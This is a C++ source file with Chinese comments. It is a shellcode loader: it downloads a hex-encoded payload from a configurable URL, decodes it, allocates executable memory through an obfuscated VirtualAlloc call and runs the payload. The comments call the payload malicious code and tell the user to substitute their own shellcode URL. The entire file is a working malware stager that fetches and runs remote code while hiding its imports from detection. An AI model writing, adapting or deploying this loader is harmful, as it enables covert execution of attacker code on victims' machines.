#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include "lazy_importer.hpp"

using namespace std;


// 将十六进制中的单个字符转换为相应的整数值
unsigned char hexCharToByte(char character) {
    if (character >= '0' && character <= '9') {
        return character - '0';
    }
    if (character >= 'a' && character <= 'f') {
        return character - 'a' + 10;
    }
    if (character >= 'A' && character <= 'F') {
        return character - 'A' + 10;
    }
    return 0;
}

// 将十六进制字符串转换成字节型数组
void hexStringToBytes(const std::string& hexString, unsigned char* byteArray, int byteArraySize) {
    for (int i = 0; i < hexString.length(); i += 2) {
        byteArray[i / 2] = hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);
    }
}

/**
 * 从指定的URL下载内容并将其存储到给定的缓冲区中。
 *
 * @param url 要下载的URL
 * @param buffer 存储下载内容的缓冲区
 * @return 下载的字节数（注意：字节数是原始十六进制字符串长度的一半）
 */
size_t GetUrl_HexContent(LPSTR url, std::vector<unsigned char>& buffer) {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;
    DWORD bufferSize = 0;
    DWORD contentLength = 0;
    DWORD index = 0;
    DWORD bufferLength = sizeof(bufferSize);

    // 打开一个与互联网的连接
    hInternet = InternetOpen(L"User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        std::cerr << "InternetOpen failed. Error: " << GetLastError() << std::endl;
        return 0;
    }

    // 打开一个URL连接
    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        std::cerr << "InternetOpenUrlA failed. Error: " << GetLastError() << std::endl;
        InternetCloseHandle(hInternet);
        return 0;
    }

    // 查询HTTP响应头中的内容长度
    HttpQueryInfo(hConnect, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &bufferLength, &index);
    std::vector<char> hexBuffer(contentLength + 1, 0);

    // 读取URL返回的内容到hexBuffer中
    if (!InternetReadFile(hConnect, &hexBuffer[0], contentLength, &bytesRead)) {
        std::cerr << "InternetReadFile failed. Error: " << GetLastError() << std::endl;
    }
    else if (bytesRead > 0) {
        hexBuffer[bytesRead] = '\0';
        // 调整buffer的大小，以便存储转换后的字节数据
        buffer.resize(bytesRead / 2);
        // 将十六进制字符串转换为字节型数组
        hexStringToBytes(&hexBuffer[0], &buffer[0], bytesRead / 2);
    }

    // 关闭连接
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // 返回读取到的字节数（注意：字节数是原始十六进制字符串长度的一半）
    return bytesRead / 2;
}


int main() {
    // 把这个URL换成你的shellcode文件的URL
    LPSTR url = (char*)"http://127.0.0.1:8000/shellcode_hex.txt"; 
    
    //存放恶意代码的数组
    std::vector<unsigned char> buffer;

    //获取远程url的16进制内容,并将其存放至buffer数组
    size_t size = GetUrl_HexContent(url, buffer);

    // 在内存中分配一块可以执行的区域
    char* exec = (char*)LI_FN(VirtualAlloc)(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 将shellcode复制到该区域
    memcpy(exec, buffer.data(), size);

    // 执行该shellcode
    ((void(*) ())exec)();

    // 打印buffer的内容，只为演示，实际使用中可能并不需要这一步
    /*for (size_t i = 0; i < buffer.size(); i++) {
        printf("%02X ", buffer[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n");
        }
    }*/

    return 0;
}